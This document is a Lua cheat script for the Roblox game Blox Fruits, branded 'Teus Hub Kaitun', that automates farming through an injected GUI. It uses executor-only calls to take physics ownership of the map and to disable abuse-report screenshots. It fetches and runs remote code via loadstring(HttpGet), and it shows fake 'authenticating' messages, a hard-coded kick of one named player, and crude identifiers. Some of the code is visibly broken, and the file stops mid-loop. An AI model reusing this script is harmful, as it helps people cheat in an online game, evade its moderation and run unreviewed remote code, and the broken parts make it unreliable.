gay = tick()
print("[Teus/Info] Connecting To Server");

print("[Teus/Info] Connected To Server"); 

print("[Teus/Info] Fetching Requirements Data..."); 

print("[Teus/Info] Saving Data To Workspace"); 

print("[Teus/Info] Saving Data To Workspace"); 
print("[Teus/Info] Saving Data To Workspace"); 
print("[Teus/Info] Saving Data To Workspace"); 
print("[Teus/Info] Saving Data To Workspace"); 
print("[Teus/Info] Authencating..."); 
wait(.2)
print("[Teus/Info] Authencation Disabled, Loading Script...");

print("[Teus/Info] Loaded In "..tostring(tick()-gay).."ms")
if game.Players.LocalPlayer.Name == "Teus" then 
  game.Players.LocalPlayer:Kick("You Have Been Permerantly Banned For Reason: Bạn Đã Bị Imharbl ban vĩnh viễn") 
end 
game: GetService"RunService".Heartbeat: Connect(function() 
  sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge) 
  pcall(function() 
    for i, v in pairs(game.workspace.Enemies:GetChildren()) do 
      if v.Humanoid.Health < 1 and not aD then 
        v:Destroy() 
      end 
    end 
  end)

  pcall(function() 
    if setfflag then
        setfflag("AbuseReportScreenshot", "False")
        setfflag("AbuseReportScreenshotPercentage", "0")
    end 
    end)
end ) 
  
  ScreenGui = Instance.new("ScreenGui");

Frame = Instance.new("Frame");

UIStroke = Instance.new("UIStroke");
UIGradient = Instance.new("UIGradient");
UICorner = Instance.new("UICorner");
TextLabel = Instance.new("TextLabel");
UIGradient1 = Instance.new("UIGradient");
TextLabel1 = Instance.new("TextLabel");
UIGradient2 = Instance.new("UIGradient");
ImageLabel = Instance.new("ImageButton");
adiadi = true
ImageLabel.Activated: Connect(function () 
    game:GetService"RunService": Set3dRenderingEnabled(not a)
    adiadi = not a
end) 

ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = game:GetService("CoreGui")

Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BackgroundTransparency = 0.5
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.499250829, 0, 0.181725562, 0)
Frame.Size = UDim2.new(0, 511, 0, 76)
Frame.Parent = ScreenGui

UIStroke.Color = Color3.fromRGB(255, 255, 255)
UIStroke.Thickness = 1.5
UIStroke.Parent = Frame

UIGradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(15.000000055879354, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(207.00000286102295, 62.00000010430813, 255))
}
UIGradient.Parent = UIStroke

UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = Frame

TextLabel.Font = Enum.Font.FredokaOne
TextLabel.Text = "Teus Hub Kaitun"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 20
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0199637525, 0, 0.276315689, 0)
TextLabel.Size = UDim2.new(0, 489, 0, 11)
TextLabel.Parent = Frame

UIGradient1.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(15.000000055879354, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(207.00000286102295, 62.00000010430813, 255))
}
UIGradient1.Parent = TextLabel

TextLabel1.Font = Enum.Font.FredokaOne
TextLabel1.Text = "Teus Script | Discord.gg/teuscommunity"
TextLabel1.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel1.TextSize = 20
TextLabel1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel1.BackgroundTransparency = 1
TextLabel1.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel1.BorderSizePixel = 0
TextLabel1.Position = UDim2.new(0.0199637525, 0, 0.539473593, 0)
TextLabel1.Size = UDim2.new(0, 489, 0, 22)
TextLabel1.Parent = Frame

UIGradient2.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(15.000000055879354, 255, 255)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(207.00000286102295, 62.00000010430813, 255))
}
UIGradient2.Parent = TextLabel1

ImageLabel.Image = "rbxassetid://111005674884784"
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.448140889, 0, -0.473684222, 0)
ImageLabel.Size = UDim2.new(0, 50, 0, 50)
ImageLabel.Parent = Frame

script_time = os.time()
if not isfolder(".teus/BloxFruit/Kaitun/") then
               makefolder(".teus/BloxFruit/Kaitun/")
end
             inv = game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")
   function randomChar()

      local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#₫_&-+()/*':;;!?£~`€|$•¢√^π°÷=×{§}∆%©®™✓[]'"

      local length = 15
      local index = math.random(1, length)
      local char = charset:sub(index, index)
      return char
   end

   function getServerTime()
      RealTime = tostring(math.floor(game.Lighting.ClockTime * 100) / 100)
      RealTime = tostring(game.Lighting.ClockTime)
      RealTimeTable = RealTime:split(".")
      Minute, Second = RealTimeTable[1], tonumber(0 + tonumber(RealTimeTable[2] / 100)) * 60
      return math.floor(Minute).."min"
   end
   local badtimedicac = os.time()
         if not isfile(".teus/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name) then
        
         writefile(".teus/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name, "0")
         esltime = 0 
         end 
   ctent2 = readfile(".teus/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name)
   function updatetime()
      if not isfile(".teus/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name) then
       
         writefile(".teus/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name, "0")
         esltime = 0
      else
         ctent = readfile(".teus/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name)
         if tonumber(ctent) or ctent == "0" or ctent == "1" then
            esltime = tonumber(ctent2 or 0) + (os.time()-(badtimedicac or os.time()))
            writefile(".teus/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name, tostring(esltime))
            pcall(function() clockm:SetText(disp_time(esltime))end)
            pcall(function() TextLabel_7.Text = getServerTime() end)

         else
            noti("Something Wrong With Config, Automatically Generate A New One")
            esltime = "0"
            writefile(".teus/BloxFruit/Kaitun/eslapedtime."..game.Players.LocalPlayer.Name, "0")
         end
         end end

         function AYU_FINGERPRINT()
            if not isfile(".ayu_fingerprint") then
               fingerprint = randomChar()
               savefile(".ayu_fingerprint", fingerprint)
               return fingerprint
            else
               return readfile(".ayu_fingerpriny")
            end
         end


         function c()
            return getgenv().Config
         end

         tickcac = tick()
         local plrs = game.Players

         local lp = plrs.LocalPlayer

         local char = lp.Character

         if not isfile"conmemaydi.txt" then
           writefile("conmemaydi.txt", "") 
         end

         local Q = require(game.ReplicatedStorage.Quests)

         local R = {"BartiloQuest", "Trainees", "MarineQuest", "CitizenQuest"}


         local AkaliNotif =
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()

         local Notify = AkaliNotif.Notify

         timelol = os.time()
         BoneMobs = {
            "Reborn Skeleton [Lv. 1975]",
            "Living Zombie [Lv. 2000]",
            "Demonic Soul [Lv. 2025]",
            "Posessed Mummy [Lv. 2050]"
         }

         EctoMob = {"Ship Deckhand [Lv. 1250]", "Ship Engineer [Lv. 1275]", "Ship Steward [Lv. 1300]"}

         DoughBoss = {
            "Dough King [Lv. 2300] [Raid Boss]",
            "Cake Prince [Lv. 2300] [Raid Boss]"
         }

         MobsCakePrince = {
            "Cookie Crafter [Lv. 2200]",
            "Cake Guard [Lv. 2225]",
            "Baking Staff [Lv. 2250]",
            "Head Baker [Lv. 2275]"
         }

         backi = {
           "Human", 
         }
         fruittier = {
            ["Bomb Fruit"] = 1,
            ["Spike Fruit"] = 0,
            ["Chop Fruit"] = 4,
            ["Spring Fruit"] = 3,
            ["Kilo Fruit"] = 2,
            ["Spin Fruit"] = 5,
            ["Falcon Fruit"] = 6,
            ["Smoke Fruit"] = 7,
            ["Flame Fruit"] = 9,
            ["Ice Fruit"] = 12,
            ["Sand Fruit"] = 10,
            ["Dark Fruit"] = 11,
            ["Revive Fruit"] = 8,
            ["Diamond Fruit"] = 8,
            ["Light Fruit"] = 12,
            ["Love Fruit"] = 11,
            ["Rubber Fruit"] = 8,
            ["Barrier Fruit"] = 6,
            ["Magma Fruit"] = 14,
            ["Quake Fruit"] = 13,
            ["Portal Fruit"] = 13,
            ["Human: Buddha Fruit"] = 15,
            ["Spider Fruit"] = 12,
            ["Phonex Fruit"] = 10,
            ["Rumble Fruit"] = 15,
            ["Paw Fruit"] = 7,
            ["Gravity Fruit"] = 1,
            ["Shadow Fruit"] = 14,
            ["Dough Fruit"] = 20,
            ["Venom Fruit"] = 19,
            ["Control Fruit"] = 11,
            ["Spirit Fruit"] = 18,
            ["Dragon Fruit"] = 19,
            ["Leopard Fruit"] = 25
         }

         CocoaMobs = {"Cocoa Warrior [Lv. 2300]", "Chocolate Bar Battler [Lv. 2325]"}

         elite = {"Deandre [Lv. 1750]", "Urban [Lv. 1750]", "Diablo [Lv. 1750]"}

         meleetable = {"DragonTalon", "Superhuman", "Godhuman", "ElectricClaw", "SharkmanKarate", "DeathStep", "BlackLeg", "FishmanKarate", "Electro", "DragonClaw"}
         meleetable2 = {
            "Dragon Talon", "Superhuman", "Godhuman", "Electric Claw", "Sharkman Karate", "Death Step", "Black Leg", "Fishman Karate", "Electro", "Dragon Claw"
         }
         meleetable3 = {}
         for i, v in pairs(meleetable2) do
            meleetable3[v] = meleetable[i]
         end
meleetable4 = {}
         for i, v in pairs(meleetable) do
            meleetable4[v] = meleetable2[i]
         end

         browhat = {

            ["Black Leg"] = "BuyBlackLeg",
            ["Fishman Karate"] = "BuyFishmanKarate",
            ["Electro"] = "BuyElectro",
            ["Dragon Claw"] = function()
            dragonclawtrue = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1") == 1
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
            return dragonclawtrue
            end,
            ["Superhuman"] = "BuySuperhuman",
            ["Sharkman Karate"] = "BuySharkmanKarate",
            ["Death Step"] = "BuyDeathStep",
            ["Dragon Talon"] = "BuyDragonTalon",
            ["Godhuman"] = "BuyGodhuman",
            ["Electric Claw"] = "BuyElectricClaw"
         }

         local fruit = {"Bomb-Bomb","Spike-Spike","Chop-Chop","Spring-Spring","Kilo-Kilo","Spin-Spin","Falcon-Falcon","Smoke-Smoke","Flame-Flame","Ice-Ice","Sand-Sand","Dark-Dark","Revive-Revive","Diamond-Diamond","Light-Light","Love-Love","Rubber-Rubber","Barrier-Barrier","Magma-Magma","Portal-Portal","Quake-Quake","Human-Human: Buddha","Spider-Spider","Bird-Bird: Phoenix","Rumble-Rumble","Paw-Paw","Gravity-Gravity","Dough-Dough","Shadow-Shadow","Venom-Venom","Control-Control","Spirit-Spirit","Dragon-Dragon", "Leopard-Leopard"}
         a3 = require(game.ReplicatedStorage:WaitForChild("GuideModule"))

         function disp_time(time)
            time = tonumber(time)
            if not time then return "[err]" end
            local days = math.floor(time/86400)
            local hours = math.floor(math.fmod(time, 86400)/3600)
            local minutes = math.floor(math.fmod(time,3600)/60)
            local seconds = math.floor(math.fmod(time,60))
            return (days.."day, "..hours.."hrs, "..minutes.."min, "..seconds.."s")
         end
         if c().Misc["White Screen"] then
            game:GetService"RunService": Set3dRenderingEnabled(0)
         end
         UserInputService = game:GetService"UserInputService"
         local function MakeDraggable(topbarobject, object)
            local Dragging = nil
            local DragInput = nil
            local DragStart = nil
            local StartPosition = nil

            local function Update(input)
               local Delta = input.Position - DragStart
               local pos = UDim2.new(StartPosition.X.Scale, StartPosition.X.Offset + Delta.X, StartPosition.Y.Scale, StartPosition.Y.Offset + Delta.Y)
               local Tween = game:GetService"TweenService":Create(object, TweenInfo.new(0.15), {Position = pos})
               Tween:Play()
            end

            topbarobject.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
               Dragging = true
               DragStart = input.Position
               StartPosition = object.Position

               input.Changed:Connect(function()
               if input.UserInputState == Enum.UserInputState.End then
                  Dragging = false
               end
               end)
            end
            end)

            topbarobject.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
               DragInput = input
            end
            end)

            UserInputService.InputChanged:Connect(function(input)
            if input == DragInput and Dragging then
               Update(input)
            end
            end)
         end
function vcl(a, b) 
  if a: FindFirstChild"Level" then 
    return a.Level.Value 
   else 
     return b or 0 
  end 
end 
 
         function checkitem(sw)
            local a = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(sw)
            local b =  game.Players.LocalPlayer.Character:FindFirstChild(sw)
            if ( a and a.Name == sw)  then 
              
              return {Mastery = vcl(a , 0)} 
            end 
            
            if ( b and b.Name == sw)  then
              return {Mastery = vcl(b , 0)} 
            end 
            
            for k, v in pairs(inv) do
               if v.Name == sw then
                  return v
               end
            end
            return false
         end

 
         function checkitem2(sw)
            local a = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild(sw)
            local b =  game.Players.LocalPlayer.Character:FindFirstChild(sw)
            if ( a and a.Name == sw)  then 
              
              return {Mastery = vcl(a , 0)} 
            end 
            
            if ( b and b.Name == sw)  then 
              return {Mastery = vcl(b , 0)} 
            end 
            
            return false
         end


         function NameMelee(a)
            a = a or false
            for r, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
               if v:IsA("Tool") and v.ToolTip == "Melee" then
                  if a then
                     return v
                  else
                     return v.Name
                  end
               end
            end
            for r, v in next, game:GetService("Players").LocalPlayer.Character:GetChildren() do
               if v:IsA("Tool") and v.ToolTip == "Melee" then
                  if a then
                     return v
                  else
                     return v.Name
                  end
               end
            end
         end
         function NameDf(a)
            a = a or false
            for r, v in next, game:GetService("Players").LocalPlayer.Backpack:GetChildren() do
               if v:IsA("Tool") and v.ToolTip == "Blox Fruit" then
                  if a then
                     return v
                  else
                     return v.Name
                  end
               end
            end
            for r, v in next, game:GetService("Players").LocalPlayer.Character:GetChildren() do
               if v:IsA("Tool") and v.ToolTip == "Blox Fruit" then
                  if a then
                     return v
                  else
                     return v.Name
                  end
               end
            end 
            return "Bomb-Bomb"
         end
         function checkm2(melee)
           if melee == "DragonClaw" then
             return game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", melee, "1")
           end 
           return game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. melee, true) 
         end 
         
         function checkMelee(melee)


            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. melee, true) == 1 or game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", melee, "1") == 1 then
               return true
            end
if NameMelee() == meleetable4[melee] then return true end
            return false;
         end
         local function Turtle(image)

            rotationAngle = ( rotationAngle or 0) + 180
            game:GetService("TweenService"):Create(image, TweenInfo.new(1), {Rotation = rotationAngle}):Play()
         end
         local function fadeBlur()
            local lighting = game:GetService("Lighting")
            local blur = lighting:FindFirstChild("Blur") or Instance.new("BlurEffect")
            blur.Name = "Blur"

            local blurIntensity = 0
            local targetIntensity = 10
            game:GetService("TweenService"):Create(blur, TweenInfo.new(1), {Size = 10}):Play()
            for intensity = blur.Size, 0, -0.1 do
               blur.Size = intensity
               wait(0.05)
            end
         end

         local function resetBlur()
            local lighting = game:GetService("Lighting")
            local blur = lighting:FindFirstChild("Blur")

            if blur then
               game:GetService("TweenService"):Create(blur, TweenInfo.new(1), {Size = -0.1}):Play()
               blur:Destroy()
            end
         end
         if c().Misc.Ui then
 

local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()


local Window = Library:CreateWindow({

    Title = 'Heiskso Community Free Scripts '..os.date("%d".." ".."%B".." ".."%Y"),

    Center = true, 
    AutoShow = true, 
    TabPadding = 8,
    MenuFadeTime = 0.2
})
local Tabs = {
    Main = Window:AddTab('Con Me May Bel'), 
} 
--ThemeManager:ApplyTheme(game:GetService"HttpService":JSONDecode('{"FontColor":"ffffff","MainColor":"191925","AccentColor":"6759b3","BackgroundColor":"16161f","OutlineColor":"323232"}'))
local LeftGroupBox2 = Tabs.Main:AddRightTabbox("Main")
local CheckMelee = LeftGroupBox2:AddTab('Melee')

local LeftGroupBox3 = Tabs.Main:AddRightTabbox("Main")
local CheckSwords = LeftGroupBox3:AddTab('Swords')

local LeftGroupBox9 = Tabs.Main:AddRightTabbox("Main")
local CheckLegendSwords = LeftGroupBox9:AddTab('Legendary Swords')

local Main1 = Tabs.Main:AddLeftTabbox("Main")
local Info = Main1:AddTab('Info')
local Kaitan = Main1:AddTab('Kaitan')

-- local LeftGroupBox6 = Tabs.Main:AddLeftTabbox("Ma")
-- local Main = LeftGroupBox6:AddTab('GaySex')
-- 
local LeftGroupBox7 = Tabs.Main:AddLeftTabbox("GaysEx")
lmlmlmlmkmlmlkk = LeftGroupBox7:AddTab"Status" 

clockm = lmlmlmlmkmlmlkk:AddLabel"Still Updating..."
waid1 = lmlmlmlmkmlmlkk:AddLabel"What Im I Doing?"
waid2 = lmlmlmlmkmlmlkk:AddLabel"What Im I Doing 2 ?"
mgstat = lmlmlmlmkmlmlkk:AddLabel"Mirage Status: Updating"
fmstat = lmlmlmlmkmlmlkk:AddLabel"Full Moon Status: Updating"
elitestt = lmlmlmlmkmlmlkk:AddLabel"Elite Spawn: Updating"

dismcount= lmlmlmlmkmlmlkk:AddLabel"Dismention Count: Updating"

local LeftGroupBox8 = Tabs.Main:AddLeftTabbox("Main")
local CheckQuest = LeftGroupBox8:AddTab('Unlock Quest')

local LeftGroupBox4 = Tabs.Main:AddLeftTabbox("Main")
local CheckGun = LeftGroupBox4:AddTab('Guns')

Info:AddLabel("Teus Community Kaitun Script") 
    Time = Info:AddLabel("ServerTime")
    function UpdateTime()
        local GameTime = math.floor(workspace.DistributedGameTime+0.5)
        local Hour = math.floor(GameTime/(60^2))%24
        local Minute = math.floor(GameTime/(60^1))%60
        local Second = math.floor(GameTime/(60^0))%60
        Time:SetText("Hour "..Hour.." Minute "..Minute.." Second "..Second)
    end
    function MoonTextureId()
    if Sea1 then
        return game:GetService("Lighting").FantasySky.MoonTextureId
    elseif Sea2 then
        return game:GetService("Lighting").FantasySky.MoonTextureId
    elseif Sea3 then
        return game:GetService("Lighting").Sky.MoonTextureId
    end
end

Kaitan:AddToggle('KaitunF', {
    Text = 'Start Kaitun',
    Default = true,
})

Toggles.KaitanF:OnChanged(function(value)
    getgenv().ForceStop = not value
end)
Shisui = CheckLegendSwords:AddLabel("[-] : Shisui Sword")
Saddi = CheckLegendSwords:AddLabel("[-] : Saddi Sword")
Wando = CheckLegendSwords:AddLabel("[-] : Wando Sword")


Kaitan:AddButton("Show Item", function()
    local cac = require(game:GetService("Players").LocalPlayer.PlayerGui.Main.UIController.Inventory)
		local Inventory = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")
		local Items = {}
		local RaityLevel = {"Mythical","Legendary","Rare","Uncommon","Common"}
		local RaityColor =  {
			["Common"] = Color3.fromRGB(179, 179, 179),
			["Uncommon"] = Color3.fromRGB(92, 140, 211),
			["Rare"] =  Color3.fromRGB(140, 82, 255),
			["Legendary"] = Color3.fromRGB(213, 43, 228) ,
			["Mythical"] =  Color3.fromRGB(238, 47, 50)
		}
		function GetRaity(color)
			for k,v in pairs(RaityColor) do 
				if v==color then return k end
			end
		end

		for k,v in pairs(Inventory) do 
			Items[v.Name] = v
		end

		local total = #getupvalue(cac.UpdateRender,4)
		local rac = {}
		local allitem = {}
		local total2 = 0
		while total2<total do 
			local i = 0
			while i < 25000 and total2<total do 
				game:GetService("Players").LocalPlayer.PlayerGui.Main.InventoryContainer.Right.Content.ScrollingFrame.CanvasPosition = Vector2.new(0,i)
				for k,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main.InventoryContainer.Right.Content.ScrollingFrame.Frame:GetChildren()) do 
					if v:IsA("Frame") and not rac[v.ItemName.Text] and v.ItemName.Visible==true then 
						local vaihuhu = GetRaity(v.Background.BackgroundColor3)
						if vaihuhu then
					
							if not allitem[vaihuhu] then 
								allitem[vaihuhu] = {}
							end
							table.insert(allitem[vaihuhu],v:Clone())
						end
						total2=total2+1
						rac[v.ItemName.Text] = true
					end
				end
				i=i+20
			end
			wait()
		end
		function GetXY(vec) 
			return vec*100
		end

		local tvk = Instance.new("UIListLayout")
		tvk.FillDirection = Enum.FillDirection.Vertical
		tvk.SortOrder = 2
		tvk.Padding = UDim.new(0,10)

		local Left = Instance.new("Frame",game.Players.LocalPlayer.PlayerGui.BubbleChat)
		Left.BackgroundTransparency = 1
		Left.Size = UDim2.new(.5,0,1,0) 
		tvk.Parent = Left

		local Right = Instance.new("Frame",game.Players.LocalPlayer.PlayerGui.BubbleChat)
		Right.BackgroundTransparency = 1
		Right.Size = UDim2.new(.5,0,1,0) 
		Right.Position = UDim2.new(.6,0,0,0)
		tvk:Clone().Parent = Right
		for k,v in pairs(allitem) do 
			local cac = Instance.new("Frame",Left)
			cac.BackgroundTransparency = 1
			cac.Size = UDim2.new(1,0,0,0) 
			cac.LayoutOrder = table.find(RaityLevel,k)

			local cac2 = Instance.new("Frame",Right)
			cac2.BackgroundTransparency = 1
			cac2.Size = UDim2.new(1,0,0,0) 
			cac2.LayoutOrder = table.find(RaityLevel,k)

			local tvk = Instance.new("UIGridLayout",cac)
			tvk.CellPadding = UDim2.new(.005,0,.005,0)
			tvk.CellSize =  UDim2.new(0,70,0,70)
			tvk.FillDirectionMaxCells = 100
			tvk.FillDirection = Enum.FillDirection.Horizontal

			local ccc = tvk:Clone()
			ccc.Parent = cac2
			for k,v in pairs(v) do 
				if Items[v.ItemName.Text] and Items[v.ItemName.Text].Mastery then 
					if v.ItemLine2.Text~="Accessory" then 
						local bucac = v.ItemName:Clone()
						bucac.BackgroundTransparency = 1
						bucac.TextSize = 10
						bucac.TextXAlignment  = 2
						bucac.TextYAlignment  = 2
						bucac.ZIndex  = 5
						bucac.Text = Items[v.ItemName.Text].Mastery
						bucac.Size = UDim2.new(.5,0,.5,0)
						bucac.Position = UDim2.new(.5,0,.5,0)
						bucac.Parent = v
					end
					v.Parent = cac
				elseif v.ItemLine2.Text == "Blox Fruit" then 
					v.Parent = cac2
				end
			end
			cac.AutomaticSize = 2
			cac2.AutomaticSize = 2
		end
		local ListHuhu = {
			["Superhuman"] = Vector2.new(3,2),
			["DeathStep"] = Vector2.new(4,3),
			["ElectricClaw"] = Vector2.new(2,0),
			["SharkmanKarate"] = Vector2.new(0,0),
			["DragonTalon"] = Vector2.new(1,5)
		}
		local MeleeG = Instance.new("Frame",Left)
		MeleeG.BackgroundTransparency = 1
		MeleeG.Size = UDim2.new(1,0,0,0) 
		MeleeG.LayoutOrder = table.find(RaityLevel,k)
		MeleeG.AutomaticSize=2
		MeleeG.LayoutOrder = 100
		local tvk = Instance.new("UIGridLayout",MeleeG)
		tvk.CellPadding = UDim2.new(.005,0,.005,0)
		tvk.CellSize =  UDim2.new(0,70,0,70)
		tvk.FillDirectionMaxCells = 100
		tvk.FillDirection = Enum.FillDirection.Horizontal

		local cac = {"Superhuman","ElectricClaw","DragonTalon","SharkmanKarate","DeathStep","GodHuman"}
		for k,v in pairs(cac) do
			if ListHuhu[v] and game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy"..v,true) == 1 then 
				local huhu = Instance.new("ImageLabel",MeleeG)
				huhu.Image = "rbxassetid://15992619207"
				huhu.ImageRectSize = Vector2.new(100,100)
				huhu.ImageRectOffset = ListHuhu[v]*100
			end
		end
		function formatNumber(v)
			return tostring(v):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
		end
		game:GetService("Players").LocalPlayer.PlayerGui.Main.Beli.Position = UDim2.new(0,800,0,500)
		game:GetService("Players").LocalPlayer.PlayerGui.Main.Level.Position = UDim2.new(0,800,0,550)

		local thieunang = game:GetService("Players").LocalPlayer.PlayerGui.Main.Fragments:Clone()
		thieunang.Parent = game:GetService("Players").LocalPlayer.PlayerGui.BubbleChat
		thieunang.Position = UDim2.new(0,800,0.63,0)
		local n = formatNumber(game.Players.LocalPlayer.Data.Fragments.Value)
		thieunang.Text = "ƒ"..n
		pcall(function() 
			game:GetService("Players").LocalPlayer.PlayerGui.Main.MenuButton:Destroy()
		end)
		pcall(function() 
			game:GetService("Players").LocalPlayer.PlayerGui.Main.HP:Destroy()
		end)
		pcall(function() 
			game:GetService("Players").LocalPlayer.PlayerGui.Main.Energy:Destroy()
		end)
		for k,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Main:GetChildren()) do 
			if v:IsA("ImageButton") then 
				v:Destroy()
			end
		end
		pcall(function() 
			game:GetService("Players").LocalPlayer.PlayerGui.Main.Compass:Destroy()
		end)
end)
Kaitan:AddButton('Rejoin Server', function()
    game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").localPlayer)
end)

Kaitan:AddToggle('Condi', {
    Text = 'White Screen',
    Default = false,
})

Toggles.Condi:OnChanged(function(value)
  
    if value then 
        game:GetService"RunService":Set3dRenderingEnabled(true) 
    return; 
    end 
    game:GetService"RunService":Set3dRenderingEnabled(false)
end) 

Kaitan:AddToggle('Condi2', {
    Text = 'Chest Farm',
    Default = false,
})

Toggles.Condi2:OnChanged(function(value)
  getgenv().Config.ChestFarm = value
end) 



PlayerName = Info:AddLabel("Player Name: "..game.Players.LocalPlayer.Name) 
vclui = {}
vclui.Superhuman = CheckMelee:AddLabel("[-] : Superhuman")

vclui["Death Step"] = CheckMelee:AddLabel("[-] : Death Step")
vclui["Sharkman Karate"] = CheckMelee:AddLabel("[-] : Sharkman Karate")
vclui["Electric Claw"] = CheckMelee:AddLabel("[-] : Electric Claw")
vclui["Dragon Talon"] = CheckMelee:AddLabel("[-] : Dragon Talon")
vclui.Godhuman = CheckMelee:AddLabel("[-] : God Human")



TrueTripleKatana = CheckSwords:AddLabel("[-] : True Triple Katana")

Saber = CheckSwords:AddLabel("[-] : Saber")
Rengoku = CheckSwords:AddLabel("[-] : Rengoku")
MidnightBlade = CheckSwords:AddLabel("[-] : Midnight Blade")
DragonTrident = CheckSwords:AddLabel("[-] : DragonTrident")
Yama = CheckSwords:AddLabel("[-] : Yama")
BuddySword = CheckSwords:AddLabel("[-] : Buddy Sword")
Canvander = CheckSwords:AddLabel("[-] : Canvander")
SpikeyTrident = CheckSwords:AddLabel("[-] : Spikey Trident")
HallowScythe = CheckSwords:AddLabel("[-] : Hallow Scythe")
DarkDagger = CheckSwords:AddLabel("[-] : Dark Dagger")
Tushita = CheckSwords:AddLabel("[-] : Tushita")



Kabucha = CheckGun:AddLabel("[-] : Kabucha Gun")

AcidumRifle = CheckGun:AddLabel("[-] : Acidum Rifle")
BizarreRifle = CheckGun:AddLabel("[-] : Bizarre Rifle")
BartiloQuest = CheckQuest:AddLabel("[-] : Bartilo Quest")
DonSwanQuest = CheckQuest:AddLabel("[-] : Don Swan Quest")
KillDonSwan = CheckQuest:AddLabel("[-] : Kill Don Swan") 

spawn(

    function()

        while wait(1) do 
          pcall(function ()
            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BartiloQuestProgress", "Bartilo") == 3 then
                BartiloQuest:SetText("[+] : Bartilo Quest")
            end
            if game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables")["FlamingoAccess"] then
            
                DonSwanQuest:SetText("[+] : Don Swan Quest")
            end
            if zqp == 1 then
                KillDonSwan:SetText("[+] : Kill Don Swan")
            end
        end)
    
       --print     spawn(
          --      function()
                    for i, v in pairs(
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")
                    ) do
                        if v.Name == "Saber" then
                            Saber:SetText("[+] : Saber")
                        end
                        if v.Name == "Rengoku" then
                            Rengoku:SetText("[+] : Rengoku")
                        end
                        if v.Name == "Midnight Blade" then
                            MidnightBlade:SetText("[+] : Midnight Blade")
                        end
                        if v.Name == "Dragon Trident" then
                            DragonTrident:SetText("[+] : Dragon Trident")
                        end
                        if v.Name == "Yama" then
                            Yama:SetText("[+] : Yama")
                        end
                        if v.Name == "Buddy Sword" then
                            BuddySword:SetText("[+] : Buddy Sword")
                        end
                        if v.Name == "Canvander" then
                            Canvander:SetText("[+] : Canvander")
                        end
                        if v.Name == "Spikey Trident" then
                            SpikeyTrident:SetText("[+] : Spikey Trident")
                        end
                        if v.Name == "Hallow Scythe" then
                            HallowScythe:SetText("[+] : Hallow Scythe")
                        end
                        if v.Name == "Dark Dagger" then
                            DarkDagger:SetText("[+] : Dark Dagger")
                        end
                        if v.Name == "Acidum Rifle" then
                            AcidumRifle:SetText("[+] : Acidum Rifle")
                        end
                        if v.Name == "Kabucha" then
                            Kabucha:SetText("[+] : Kabucha")
                        end
